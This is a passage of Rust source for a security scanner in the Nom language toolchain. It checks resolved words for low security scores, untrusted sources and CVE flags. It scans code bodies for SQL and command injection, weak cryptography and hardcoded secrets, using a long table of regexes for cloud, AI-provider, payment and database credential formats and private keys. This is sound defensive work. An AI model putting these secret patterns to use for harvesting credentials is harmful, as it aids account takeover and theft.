//! nom-security: Deep security analysis for Nom compositions and .nomtu bodies.
//!
//! Two layers of security checking:
//!
//! **Layer 1 — .nom program security (compile-time):**
//!   - Minimum security/reliability scores for resolved words
//!   - License compatibility and supply-chain provenance
//!   - CVE flags, untrusted sources
//!   - Effect escalation detection
//!
//! **Layer 2 — .nomtu body security (dictionary-time):**
//!   - OWASP Top 10 pattern detection (injection, XSS, XXE, etc.)
//!   - Attack payload signatures (reverse shells, msfvenom, backdoors)
//!   - Secrets and credential detection (API keys, tokens, private keys)
//!   - Weak cryptography detection (MD5, SHA1, DES, ECB, insecure RNG)
//!   - Insecure deserialization, path traversal, hardcoded config
//!
//! Produces a [`SecurityReport`] for program-level checks and
//! `Vec<SecurityFinding>` for body-level scans.

use nom_ast::{Declaration, NomRef, SourceFile, Statement};
use nom_resolver::{Resolver, ResolverError};
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::sync::LazyLock;
use thiserror::Error;

// ── Errors ───────────────────────────────────────────────────────────────────

#[derive(Debug, Error)]
pub enum SecurityError {
    #[error("resolver error: {0}")]
    Resolver(#[from] ResolverError),
    #[error("serialization error: {0}")]
    Json(#[from] serde_json::Error),
}

// ── Severity ─────────────────────────────────────────────────────────────────

/// Security finding severity levels.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
pub enum Severity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

impl Severity {
    /// Parse from a string (case-insensitive). Returns `None` for unknown.
    pub fn from_str_loose(s: &str) -> Option<Self> {
        match s.to_ascii_lowercase().as_str() {
            "info" => Some(Self::Info),
            "low" => Some(Self::Low),
            "medium" | "med" => Some(Self::Medium),
            "high" => Some(Self::High),
            "critical" | "crit" => Some(Self::Critical),
            _ => None,
        }
    }
}

impl std::fmt::Display for Severity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Severity::Info => write!(f, "INFO"),
            Severity::Low => write!(f, "LOW"),
            Severity::Medium => write!(f, "MEDIUM"),
            Severity::High => write!(f, "HIGH"),
            Severity::Critical => write!(f, "CRITICAL"),
        }
    }
}

// ── SecurityFinding ──────────────────────────────────────────────────────────

/// A single security finding from scanning a .nomtu body or .nom program.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityFinding {
    pub severity: Severity,
    /// Category: "injection", "secrets", "crypto", "payload", "xss", "deserialization",
    /// "path_traversal", "config", "score", "supply_chain", "cve", "effect_escalation",
    /// "web", "credential", "execution", "network", "data_handling", "protocol", "guardrail".
    pub category: String,
    /// Rule identifier, e.g. "SEC-001".
    pub rule_id: String,
    pub message: String,
    /// The matching line or pattern, if available.
    pub evidence: Option<String>,
    /// 1-based line number within the body, if available.
    pub line: Option<usize>,
    /// Suggested fix.
    pub remediation: Option<String>,
    // Keep backward-compat fields for program-level findings.
    /// Word name (populated for program-level findings).
    pub word: Option<String>,
    /// Variant name (populated for program-level findings).
    pub variant: Option<String>,
}

// ── SecurityReport (program-level) ──────────────────────────────────────────

/// Summary security report for a .nom source file.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityReport {
    pub findings: Vec<SecurityFinding>,
    pub passed: bool,
    pub max_severity: Option<Severity>,
}

impl SecurityReport {
    pub fn new() -> Self {
        Self {
            findings: Vec::new(),
            passed: true,
            max_severity: None,
        }
    }

    pub fn push(&mut self, finding: SecurityFinding) {
        if finding.severity >= Severity::High {
            self.passed = false;
        }
        let sev = finding.severity;
        self.findings.push(finding);
        self.max_severity = Some(match self.max_severity {
            Some(current) => current.max(sev),
            None => sev,
        });
    }

    pub fn critical_count(&self) -> usize {
        self.findings
            .iter()
            .filter(|f| f.severity == Severity::Critical)
            .count()
    }

    pub fn high_count(&self) -> usize {
        self.findings
            .iter()
            .filter(|f| f.severity == Severity::High)
            .count()
    }

    /// Serialize the report to JSON.
    pub fn to_json(&self) -> Result<String, SecurityError> {
        Ok(serde_json::to_string_pretty(self)?)
    }
}

impl Default for SecurityReport {
    fn default() -> Self {
        Self::new()
    }
}

// ── SecurityConfig ───────────────────────────────────────────────────────────

/// Security checker configuration.
#[derive(Debug, Clone)]
pub struct SecurityConfig {
    /// Minimum acceptable security score. Words below this threshold are flagged.
    pub min_security_score: f64,
    /// Minimum acceptable reliability score.
    pub min_reliability_score: f64,
    /// If true, flag words from non-registry sources.
    pub require_registry_source: bool,
    /// Allowed license identifiers (SPDX). Empty = allow all.
    pub allowed_licenses: Vec<String>,
}

impl Default for SecurityConfig {
    fn default() -> Self {
        Self {
            min_security_score: 0.7,
            min_reliability_score: 0.5,
            require_registry_source: false,
            allowed_licenses: Vec::new(),
        }
    }
}

// ── SecurityChecker (Layer 1 — program-level) ───────────────────────────────

/// Runs security checks on a .nom source file against the dictionary.
pub struct SecurityChecker<'r> {
    resolver: &'r Resolver,
    config: SecurityConfig,
}

impl<'r> SecurityChecker<'r> {
    pub fn new(resolver: &'r Resolver, config: SecurityConfig) -> Self {
        Self { resolver, config }
    }

    pub fn with_defaults(resolver: &'r Resolver) -> Self {
        Self::new(resolver, SecurityConfig::default())
    }

    /// Run all security checks and return a report.
    pub fn check(&self, source: &SourceFile) -> Result<SecurityReport, SecurityError> {
        let mut report = SecurityReport::new();
        for decl in &source.declarations {
            self.check_declaration(decl, &mut report)?;
        }
        Ok(report)
    }

    fn check_declaration(
        &self,
        decl: &Declaration,
        report: &mut SecurityReport,
    ) -> Result<(), SecurityError> {
        for stmt in &decl.statements {
            match stmt {
                Statement::Need(need) => {
                    self.check_nom_ref(&need.reference, report)?;
                }
                Statement::Flow(flow) => {
                    self.check_flow_steps(&flow.chain.steps, report)?;
                }
                _ => {}
            }
        }
        Ok(())
    }

    fn check_flow_steps(
        &self,
        steps: &[nom_ast::FlowStep],
        report: &mut SecurityReport,
    ) -> Result<(), SecurityError> {
        for step in steps {
            match step {
                nom_ast::FlowStep::Ref(nom_ref) => {
                    self.check_nom_ref(nom_ref, report)?;
                }
                nom_ast::FlowStep::Branch(block) => {
                    for arm in &block.arms {
                        self.check_flow_steps(&arm.chain.steps, report)?;
                    }
                }
                _ => {}
            }
        }
        Ok(())
    }

    fn check_nom_ref(
        &self,
        nom_ref: &NomRef,
        report: &mut SecurityReport,
    ) -> Result<(), SecurityError> {
        let entry = match self.resolver.resolve(nom_ref) {
            Ok(e) => e,
            Err(ResolverError::NotFound { .. }) => return Ok(()),
            Err(e) => return Err(SecurityError::Resolver(e)),
        };

        let label = format!(
            "{}{}",
            entry.word,
            entry
                .variant
                .as_deref()
                .map(|v| format!("::{v}"))
                .unwrap_or_default()
        );

        // Check minimum security score
        if entry.security < self.config.min_security_score {
            report.push(SecurityFinding {
                severity: if entry.security < 0.3 {
                    Severity::Critical
                } else {
                    Severity::High
                },
                category: "score".to_owned(),
                rule_id: "SEC-P01".to_owned(),
                message: format!(
                    "{label} has security score {:.2} below minimum {:.2}",
                    entry.security, self.config.min_security_score
                ),
                evidence: None,
                line: None,
                remediation: Some(
                    "Choose a word with higher security score or audit this word's body".to_owned(),
                ),
                word: Some(entry.word.clone()),
                variant: entry.variant.clone(),
            });
        }

        // Check minimum reliability score
        if entry.reliability < self.config.min_reliability_score {
            report.push(SecurityFinding {
                severity: Severity::Medium,
                category: "score".to_owned(),
                rule_id: "SEC-P02".to_owned(),
                message: format!(
                    "{label} has reliability score {:.2} below minimum {:.2}",
                    entry.reliability, self.config.min_reliability_score
                ),
                evidence: None,
                line: None,
                remediation: Some("Choose a more reliable variant or add tests".to_owned()),
                word: Some(entry.word.clone()),
                variant: entry.variant.clone(),
            });
        }

        // Check for untrusted source
        if self.config.require_registry_source {
            if let Some(source) = &entry.source_repo {
                if !source.starts_with("https://registry.nom-lang.org") {
                    report.push(SecurityFinding {
                        severity: Severity::Low,
                        category: "supply_chain".to_owned(),
                        rule_id: "SEC-P03".to_owned(),
                        message: format!("{label} comes from untrusted source: {source}"),
                        evidence: Some(source.clone()),
                        line: None,
                        remediation: Some("Use words from the official registry".to_owned()),
                        word: Some(entry.word.clone()),
                        variant: entry.variant.clone(),
                    });
                }
            } else {
                report.push(SecurityFinding {
                    severity: Severity::Low,
                    category: "supply_chain".to_owned(),
                    rule_id: "SEC-P04".to_owned(),
                    message: format!("{label} has no source URL (local or unverified)"),
                    evidence: None,
                    line: None,
                    remediation: Some("Register the word with a verified source".to_owned()),
                    word: Some(entry.word.clone()),
                    variant: entry.variant.clone(),
                });
            }
        }

        // Check for CVE flags
        if let Some(hash) = &entry.hash {
            if hash.starts_with("CVE-") {
                report.push(SecurityFinding {
                    severity: Severity::Critical,
                    category: "cve".to_owned(),
                    rule_id: "SEC-P05".to_owned(),
                    message: format!("{label} is flagged with known vulnerability: {hash}"),
                    evidence: Some(hash.clone()),
                    line: None,
                    remediation: Some(
                        "Remove or replace this word with a patched version".to_owned(),
                    ),
                    word: Some(entry.word.clone()),
                    variant: entry.variant.clone(),
                });
            }
        }

        // Effect escalation: if entry has dangerous effects, warn
        for effect in &entry.effects {
            match effect.as_str() {
                "network" | "filesystem" | "process" | "system" => {
                    report.push(SecurityFinding {
                        severity: Severity::Info,
                        category: "effect_escalation".to_owned(),
                        rule_id: "SEC-P06".to_owned(),
                        message: format!(
                            "{label} declares effect '{effect}' — verify this is expected"
                        ),
                        evidence: Some(effect.clone()),
                        line: None,
                        remediation: None,
                        word: Some(entry.word.clone()),
                        variant: entry.variant.clone(),
                    });
                }
                _ => {}
            }
        }

        Ok(())
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// Layer 2 — .nomtu body scanning
// ══════════════════════════════════════════════════════════════════════════════

// ── TruffleHog-grade secret detection patterns ──────────────────────────────

/// Secret detection patterns from TruffleHog's 883-detector engine.
/// Each pattern has: provider name, regex pattern, severity, rule_id.
const SECRET_PATTERNS: &[(&str, &str, Severity, &str)] = &[
    // Cloud providers
    (
        "AWS Access Key",
        r"AKIA[0-9A-Z]{16}",
        Severity::Critical,
        "SEC-S01",
    ),
    (
        "AWS Secret Key",
        r"(?i)aws_secret_access_key\s*[=:]\s*[A-Za-z0-9/+=]{40}",
        Severity::Critical,
        "SEC-S02",
    ),
    (
        "GCP Service Account",
        r#""type"\s*:\s*"service_account""#,
        Severity::Critical,
        "SEC-S03",
    ),
    (
        "Azure Connection String",
        r"(?i)DefaultEndpointsProtocol=https;AccountName=",
        Severity::High,
        "SEC-S04",
    ),
    // AI providers
    (
        "OpenAI API Key",
        r"sk-(?:proj-)?[a-zA-Z0-9]{20,}T3BlbkFJ",
        Severity::Critical,
        "SEC-S05",
    ),
    (
        "Anthropic API Key",
        r"sk-ant-(?:admin01|api03)-[\w\-]{20,}",
        Severity::Critical,
        "SEC-S06",
    ),
    (
        "HuggingFace Token",
        r"hf_[a-zA-Z0-9]{34}",
        Severity::High,
        "SEC-S07",
    ),
    // Version control
    (
        "GitHub Token",
        r"gh[pousr]_[A-Za-z0-9_]{36,}",
        Severity::Critical,
        "SEC-S08",
    ),
    (
        "GitHub Fine-Grained PAT",
        r"github_pat_[A-Za-z0-9_]{22,}",
        Severity::Critical,
        "SEC-S09",
    ),
    (
        "GitLab Token",
        r"glpat-[A-Za-z0-9\-]{20,}",
        Severity::Critical,
        "SEC-S10",
    ),
    (
        "Bitbucket App Password",
        r"ATBB[A-Za-z0-9]{32}",
        Severity::High,
        "SEC-S11",
    ),
    // Communication
    (
        "Slack Bot Token",
        r"xoxb-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}",
        Severity::High,
        "SEC-S12",
    ),
    (
        "Slack Webhook",
        r"https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]+",
        Severity::Medium,
        "SEC-S13",
    ),
    (
        "Discord Webhook",
        r"https://discord(?:app)?\.com/api/webhooks/[0-9]+/[A-Za-z0-9_\-]+",
        Severity::Medium,
        "SEC-S14",
    ),
    (
        "Telegram Bot Token",
        r"[0-9]+:AA[A-Za-z0-9_\-]{33}",
        Severity::High,
        "SEC-S15",
    ),
    // Payment
    (
        "Stripe Secret Key",
        r"[rs]k_live_[a-zA-Z0-9]{20,}",
        Severity::Critical,
        "SEC-S16",
    ),
    (
        "Stripe Publishable Key",
        r"pk_live_[a-zA-Z0-9]{20,}",
        Severity::Low,
        "SEC-S17",
    ),
    (
        "PayPal Client Secret",
        r#"(?i)paypal.*secret.*['"][A-Za-z0-9\-]{32,}['"]"#,
        Severity::High,
        "SEC-S18",
    ),
    (
        "Square Access Token",
        r"EAAA[a-zA-Z0-9\-\+\=]{60}",
        Severity::Critical,
        "SEC-S19",
    ),
    // Email
    (
        "SendGrid API Key",
        r"SG\.[\w\-]{20,24}\.[\w\-]{39,50}",
        Severity::High,
        "SEC-S20",
    ),
    (
        "Mailgun API Key",
        r"key-[a-zA-Z0-9]{32}",
        Severity::High,
        "SEC-S21",
    ),
    (
        "Mailchimp API Key",
        r"[0-9a-f]{32}-us[0-9]{1,2}",
        Severity::Medium,
        "SEC-S22",
    ),
    // Infrastructure
    (
        "Twilio Account SID",
        r"AC[0-9a-f]{32}",
        Severity::High,
        "SEC-S23",
    ),
    (
        "Twilio Auth Token",
        r#"(?i)twilio.*auth.*token.*['"][0-9a-f]{32}['"]"#,
        Severity::Critical,
        "SEC-S24",
    ),
    (
        "DigitalOcean Token",
        r"dop_v1_[a-f0-9]{64}",
        Severity::Critical,
        "SEC-S26",
    ),
    (
        "Supabase Key",
        r"(?i)supabase.*key.*eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+",
        Severity::High,
        "SEC-S29",
    ),
    // Monitoring
    (
        "Sentry DSN",
        r"https://[a-f0-9]{32}@[a-z0-9]+\.ingest\.sentry\.io/[0-9]+",
        Severity::Medium,
        "SEC-S31",
    ),
    // Database
    (
        "MongoDB Connection String",
        r"mongodb(?:\+srv)?://[^\s]+@[^\s]+",
        Severity::Critical,
        "SEC-S34",
    ),
    (
        "PostgreSQL Connection String",
        r"postgres(?:ql)?://[^\s]+:[^\s]+@[^\s]+",
        Severity::Critical,
        "SEC-S35",
    ),
    (
        "Redis Connection String",
        r"redis://[^\s]+:[^\s]+@[^\s]+",
        Severity::Critical,
        "SEC-S36",
    ),
    (
        "MySQL Connection String",
        r"mysql://[^\s]+:[^\s]+@[^\s]+",
        Severity::Critical,
        "SEC-S37",
    ),
    // Auth
    (
        "JWT Token",
        r"eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_\+/=]+",
        Severity::High,
        "SEC-S38",
    ),
    (
        "OAuth Client Secret",
        r#"(?i)client.?secret\s*[=:]\s*['"][A-Za-z0-9\-_]{20,}['"]"#,
        Severity::High,
        "SEC-S39",
    ),
    (
        "Bearer Token",
        r"(?i)bearer\s+[A-Za-z0-9\-_\.]{20,}",
        Severity::Medium,
        "SEC-S40",
    ),
    // Package registries
    (
        "NPM Token",
        r"npm_[A-Za-z0-9]{36}",
        Severity::High,
        "SEC-S41",
    ),
    (
        "PyPI Token",
        r"pypi-AgEIcHlwaS5vcmcCJ[a-zA-Z0-9\-_]{50,}",
        Severity::High,
        "SEC-S42",
    ),
    (
        "Docker Config Auth",
        r#""auth"\s*:\s*"[A-Za-z0-9+/=]{20,}""#,
        Severity::High,
        "SEC-S43",
    ),
    (
        "Postman API Key",
        r"PMAK-[a-zA-Z0-9]{59}",
        Severity::Medium,
        "SEC-S44",
    ),
    // Certificates & private keys
    (
        "RSA Private Key",
        r"-----BEGIN RSA PRIVATE KEY-----",
        Severity::Critical,
        "SEC-S45",
    ),
    (
        "EC Private Key",
        r"-----BEGIN EC PRIVATE KEY-----",
        Severity::Critical,
        "SEC-S46",
    ),
    (
        "PKCS8 Private Key",
        r"-----BEGIN PRIVATE KEY-----",
        Severity::Critical,
        "SEC-S47",
    ),
    (
        "SSH Private Key",
        r"-----BEGIN OPENSSH PRIVATE KEY-----",
        Severity::Critical,
        "SEC-S48",
    ),
    (
        "PGP Private Key",
        r"-----BEGIN PGP PRIVATE KEY BLOCK-----",
        Severity::Critical,
        "SEC-S49",
    ),
    (
        "Certificate",
        r"-----BEGIN CERTIFICATE-----",
        Severity::Info,
        "SEC-S50",
    ),
];

/// Compiled regex cache for SECRET_PATTERNS.
struct CompiledSecretPattern {
    provider: &'static str,
    regex: Regex,
    severity: Severity,
    rule_id: &'static str,
}

static COMPILED_SECRET_PATTERNS: LazyLock<Vec<CompiledSecretPattern>> = LazyLock::new(|| {
    SECRET_PATTERNS
        .iter()
        .filter_map(|(provider, pattern, severity, rule_id)| {
            Regex::new(pattern).ok().map(|regex| CompiledSecretPattern {
                provider,
                regex,
                severity: *severity,
                rule_id,
            })
        })
        .collect()
});

// ── Guardrails (RedAmon-inspired) ───────────────────────────────────────────

/// Compile-time guardrails for .nom programs (inspired by RedAmon).
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct Guardrails {
    /// Domains that should never appear in code.
    pub blocked_domains: Vec<String>,
    /// IPs that should never be hardcoded.
    pub blocked_ips: Vec<String>,
    /// Maximum allowed privilege level.
    pub max_privilege_level: String,
    /// Effects that must be declared.
    pub required_effects: Vec<String>,
    /// .nomtu words that are blocked by policy.
    pub banned_words: Vec<String>,
}

/// Check a .nom program source against guardrails.
pub fn check_guardrails(source: &str, guardrails: &Guardrails) -> Vec<SecurityFinding> {
    let mut findings = Vec::new();
    for (i, line) in source.lines().enumerate() {
        let trimmed = line.trim();

        for domain in &guardrails.blocked_domains {
            if trimmed.contains(domain.as_str()) {
                findings.push(SecurityFinding {
                    severity: Severity::Critical,
                    category: "guardrail".to_owned(),
                    rule_id: "SEC-G01".to_owned(),
                    message: format!("Blocked domain '{domain}' found in source"),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some("Remove references to blocked domains".to_owned()),
                    word: None,
                    variant: None,
                });
            }
        }

        for ip in &guardrails.blocked_ips {
            if trimmed.contains(ip.as_str()) {
                findings.push(SecurityFinding {
                    severity: Severity::High,
                    category: "guardrail".to_owned(),
                    rule_id: "SEC-G02".to_owned(),
                    message: format!("Blocked IP '{ip}' found in source"),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some("Remove hardcoded blocked IPs".to_owned()),
                    word: None,
                    variant: None,
                });
            }
        }

        for word in &guardrails.banned_words {
            if trimmed.contains(word.as_str()) {
                findings.push(SecurityFinding {
                    severity: Severity::High,
                    category: "guardrail".to_owned(),
                    rule_id: "SEC-G03".to_owned(),
                    message: format!("Banned word '{word}' found in source"),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some("Remove or replace the banned word".to_owned()),
                    word: None,
                    variant: None,
                });
            }
        }
    }

    // Check required effects: if required_effects is non-empty, the source must declare them
    for effect in &guardrails.required_effects {
        let effect_decl = format!("effect {effect}");
        let effect_decl2 = format!("effects: [{effect}");
        if !source.contains(&effect_decl) && !source.contains(&effect_decl2) {
            findings.push(SecurityFinding {
                severity: Severity::Medium,
                category: "guardrail".to_owned(),
                rule_id: "SEC-G04".to_owned(),
                message: format!("Required effect '{effect}' not declared"),
                evidence: None,
                line: None,
                remediation: Some(format!("Declare 'effect {effect}' in the program")),
                word: None,
                variant: None,
            });
        }
    }

    findings
}

/// Scan a .nomtu body for security issues. Returns findings sorted by severity (highest first).
pub fn scan_body(body: &str, language: &str) -> Vec<SecurityFinding> {
    let mut findings = Vec::new();
    scan_injection(body, language, &mut findings);
    scan_secrets(body, &mut findings);
    scan_crypto(body, &mut findings);
    scan_payloads(body, &mut findings);
    scan_deserialization(body, language, &mut findings);
    scan_xss(body, language, &mut findings);
    scan_path_traversal(body, &mut findings);
    scan_hardcoded_config(body, &mut findings);
    // Kali-category scanners
    scan_web_vulns(body, language, &mut findings);
    scan_credential_vulns(body, &mut findings);
    scan_execution_vulns(body, language, &mut findings);
    scan_network_vulns(body, &mut findings);
    scan_data_handling(body, &mut findings);
    // Suricata-inspired protocol analysis
    scan_protocol_vulns(body, &mut findings);
    findings.sort_by(|a, b| b.severity.cmp(&a.severity));
    findings
}

/// Compute a security score from findings. 1.0 = clean, 0.0 = critical issues present.
pub fn security_score(findings: &[SecurityFinding]) -> f64 {
    if findings.is_empty() {
        return 1.0;
    }
    let mut penalty = 0.0_f64;
    for f in findings {
        penalty += match f.severity {
            Severity::Critical => 0.40,
            Severity::High => 0.20,
            Severity::Medium => 0.10,
            Severity::Low => 0.03,
            Severity::Info => 0.0,
        };
    }
    (1.0 - penalty).max(0.0)
}

// ── Injection scanner ────────────────────────────────────────────────────────

/// Detect SQL injection, command injection, and eval patterns.
fn scan_injection(body: &str, language: &str, out: &mut Vec<SecurityFinding>) {
    // SQL injection: string concatenation in queries
    static SQL_CONCAT_PATTERNS: &[&str] = &[
        "\"SELECT ",
        "\"INSERT ",
        "\"UPDATE ",
        "\"DELETE ",
        "'SELECT ",
        "'INSERT ",
        "'UPDATE ",
        "'DELETE ",
        "\"DROP ",
        "'DROP ",
    ];
    static SQL_INTERP_MARKERS: &[&str] = &[
        "\" +", "\" .", "' +", "' .", "${", "f\"", "f'", ".format(", "% ",
    ];

    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();

        // SQL string concatenation
        for pattern in SQL_CONCAT_PATTERNS {
            if trimmed.contains(pattern) {
                for marker in SQL_INTERP_MARKERS {
                    if trimmed.contains(marker) {
                        out.push(SecurityFinding {
                            severity: Severity::Critical,
                            category: "injection".to_owned(),
                            rule_id: "SEC-B01".to_owned(),
                            message: "SQL query with string concatenation/interpolation — use parameterized queries".to_owned(),
                            evidence: Some(trimmed.to_owned()),
                            line: Some(i + 1),
                            remediation: Some("Use parameterized queries (?, $1) instead of string concatenation".to_owned()),
                            word: None,
                            variant: None,
                        });
                        break;
                    }
                }
            }
        }

        // Command injection: shell exec with variables
        let cmd_injection_patterns: &[(&str, &str)] = &[
            ("os.system(", "os.system() with user input"),
            (
                "subprocess.call(",
                "subprocess.call() — use subprocess.run with shell=False",
            ),
            (
                "subprocess.Popen(",
                "subprocess.Popen() — verify shell=False",
            ),
            (
                "Runtime.getRuntime().exec(",
                "Java Runtime.exec() with concatenation",
            ),
            ("eval(", "eval() — dynamic code execution"),
            ("system(", "system() call — use safer alternatives"),
            ("popen(", "popen() — command execution"),
            (
                "Process.Start(",
                "Process.Start() — verify input sanitization",
            ),
        ];
        for (pat, msg) in cmd_injection_patterns {
            if trimmed.contains(pat) {
                // Skip if it's a comment
                if is_comment(trimmed, language) {
                    continue;
                }
                let severity = if *pat == "eval(" {
                    Severity::High
                } else {
                    Severity::Medium
                };
                out.push(SecurityFinding {
                    severity,
                    category: "injection".to_owned(),
                    rule_id: "SEC-B02".to_owned(),
                    message: msg.to_string(),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some(
                        "Avoid dynamic execution; use safe APIs with validated inputs".to_owned(),
                    ),
                    word: None,
                    variant: None,
                });
            }
        }
    }
}

// ── Secrets scanner ──────────────────────────────────────────────────────────

/// Detect hardcoded secrets, API keys, tokens, and private keys.
fn scan_secrets(body: &str, out: &mut Vec<SecurityFinding>) {
    // API key prefixes (high-confidence patterns)
    static API_KEY_PREFIXES: &[(&str, &str)] = &[
        ("AKIA", "AWS Access Key ID"),
        ("sk_live_", "Stripe live secret key"),
        ("sk_test_", "Stripe test secret key"),
        ("ghp_", "GitHub personal access token"),
        ("gho_", "GitHub OAuth token"),
        ("ghu_", "GitHub user-to-server token"),
        ("ghs_", "GitHub server-to-server token"),
        ("glpat-", "GitLab personal access token"),
        ("xoxb-", "Slack bot token"),
        ("xoxp-", "Slack user token"),
        ("xoxa-", "Slack app token"),
        ("SG.", "SendGrid API key"),
    ];

    // Private key markers
    static PRIVATE_KEY_MARKERS: &[&str] = &[
        "-----BEGIN RSA PRIVATE KEY-----",
        "-----BEGIN DSA PRIVATE KEY-----",
        "-----BEGIN EC PRIVATE KEY-----",
        "-----BEGIN OPENSSH PRIVATE KEY-----",
        "-----BEGIN PRIVATE KEY-----",
        "-----BEGIN PGP PRIVATE KEY BLOCK-----",
    ];

    // Generic secret assignment patterns (case-insensitive matching)
    static SECRET_ASSIGN_PATTERNS: &[&str] = &[
        "password =",
        "password=",
        "passwd =",
        "passwd=",
        "secret =",
        "secret=",
        "api_key =",
        "api_key=",
        "apikey =",
        "apikey=",
        "token =",
        "token=",
        "aws_secret_access_key",
        "aws_access_key_id",
        "aws_session_token",
        "database_url",
        "db_password",
        "private_key =",
        "private_key=",
        "client_secret",
        "auth_token",
        "bearer ",
    ];

    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();

        // API key prefixes
        for (prefix, desc) in API_KEY_PREFIXES {
            if trimmed.contains(prefix) {
                // Only flag if it looks like a value assignment, not a variable name check
                if trimmed.contains('=') || trimmed.contains('"') || trimmed.contains('\'') {
                    out.push(SecurityFinding {
                        severity: Severity::Critical,
                        category: "secrets".to_owned(),
                        rule_id: "SEC-B03".to_owned(),
                        message: format!("Possible hardcoded {desc}"),
                        evidence: Some(redact_secret(trimmed)),
                        line: Some(i + 1),
                        remediation: Some(
                            "Use environment variables or a secrets manager".to_owned(),
                        ),
                        word: None,
                        variant: None,
                    });
                }
            }
        }

        // Private keys
        for marker in PRIVATE_KEY_MARKERS {
            if trimmed.contains(marker) {
                out.push(SecurityFinding {
                    severity: Severity::Critical,
                    category: "secrets".to_owned(),
                    rule_id: "SEC-B04".to_owned(),
                    message: "Embedded private key".to_owned(),
                    evidence: Some(marker.to_string()),
                    line: Some(i + 1),
                    remediation: Some(
                        "Store private keys in a secure vault, not in source code".to_owned(),
                    ),
                    word: None,
                    variant: None,
                });
            }
        }

        // Generic secret assignments — only flag when there's a string literal value
        let lower = trimmed.to_ascii_lowercase();
        for pat in SECRET_ASSIGN_PATTERNS {
            if lower.contains(pat) {
                // Must have a string literal after the assignment (not empty or placeholder)
                if has_string_literal_value(trimmed) {
                    out.push(SecurityFinding {
                        severity: Severity::High,
                        category: "secrets".to_owned(),
                        rule_id: "SEC-B05".to_owned(),
                        message: format!("Possible hardcoded secret ({pat})"),
                        evidence: Some(redact_secret(trimmed)),
                        line: Some(i + 1),
                        remediation: Some(
                            "Use environment variables or a secrets manager".to_owned(),
                        ),
                        word: None,
                        variant: None,
                    });
                    break; // one finding per line
                }
            }
        }

        // TruffleHog-grade regex-based secret detection
        for cp in COMPILED_SECRET_PATTERNS.iter() {
            if cp.regex.is_match(trimmed) {
                out.push(SecurityFinding {
                    severity: cp.severity,
                    category: "secrets".to_owned(),
                    rule_id: cp.rule_id.to_owned(),
                    message: format!("Possible {} detected", cp.provider),
                    evidence: Some(redact_secret(trimmed)),
                    line: Some(i + 1),
                    remediation: Some("Use environment variables or a secrets manager".to_owned()),
                    word: None,
                    variant: None,
                });
            }
        }
    }
}

// ── Crypto weakness scanner ──────────────────────────────────────────────────

/// Detect weak cryptographic algorithms and insecure random number generation.
fn scan_crypto(body: &str, out: &mut Vec<SecurityFinding>) {
    struct CryptoPattern {
        pattern: &'static str,
        severity: Severity,
        rule_id: &'static str,
        message: &'static str,
        remediation: &'static str,
    }

    static PATTERNS: &[CryptoPattern] = &[
        // Weak hash functions used for security
        CryptoPattern {
            pattern: "md5(",
            severity: Severity::High,
            rule_id: "SEC-B06",
            message: "MD5 hash function — cryptographically broken",
            remediation: "Use SHA-256, SHA-3, or Argon2 for password hashing",
        },
        CryptoPattern {
            pattern: "hashlib.md5",
            severity: Severity::High,
            rule_id: "SEC-B06",
            message: "Python MD5 — cryptographically broken",
            remediation: "Use hashlib.sha256 or argon2",
        },
        CryptoPattern {
            pattern: "MD5.Create",
            severity: Severity::High,
            rule_id: "SEC-B06",
            message: ".NET MD5 — cryptographically broken",
            remediation: "Use SHA256.Create() or Argon2",
        },
        CryptoPattern {
            pattern: "MessageDigest.getInstance(\"MD5\"",
            severity: Severity::High,
            rule_id: "SEC-B06",
            message: "Java MD5 — cryptographically broken",
            remediation: "Use MessageDigest.getInstance(\"SHA-256\")",
        },
        CryptoPattern {
            pattern: "sha1(",
            severity: Severity::High,
            rule_id: "SEC-B07",
            message: "SHA-1 hash — broken for collision resistance",
            remediation: "Use SHA-256 or SHA-3",
        },
        CryptoPattern {
            pattern: "hashlib.sha1",
            severity: Severity::High,
            rule_id: "SEC-B07",
            message: "Python SHA-1 — broken for collision resistance",
            remediation: "Use hashlib.sha256 or hashlib.sha3_256",
        },
        CryptoPattern {
            pattern: "SHA1.Create",
            severity: Severity::High,
            rule_id: "SEC-B07",
            message: ".NET SHA-1 — broken for collision resistance",
            remediation: "Use SHA256.Create()",
        },
        // Obsolete ciphers
        CryptoPattern {
            pattern: "3DES",
            severity: Severity::Medium,
            rule_id: "SEC-B08",
            message: "3DES is deprecated",
            remediation: "Use AES-256-GCM",
        },
        CryptoPattern {
            pattern: "TripleDES",
            severity: Severity::Medium,
            rule_id: "SEC-B08",
            message: "Triple DES is deprecated",
            remediation: "Use AES-256-GCM",
        },
        CryptoPattern {
            pattern: "RC4",
            severity: Severity::High,
            rule_id: "SEC-B09",
            message: "RC4 is broken — known biases in keystream",
            remediation: "Use AES-256-GCM or ChaCha20-Poly1305",
        },
        CryptoPattern {
            pattern: "Blowfish",
            severity: Severity::Medium,
            rule_id: "SEC-B10",
            message: "Blowfish has a 64-bit block size — vulnerable to birthday attacks",
            remediation: "Use AES-256-GCM",
        },
        // ECB mode
        CryptoPattern {
            pattern: "MODE_ECB",
            severity: Severity::High,
            rule_id: "SEC-B11",
            message: "ECB mode encryption — insecure, leaks patterns",
            remediation: "Use MODE_GCM or MODE_CTR",
        },
        CryptoPattern {
            pattern: "\"ECB\"",
            severity: Severity::High,
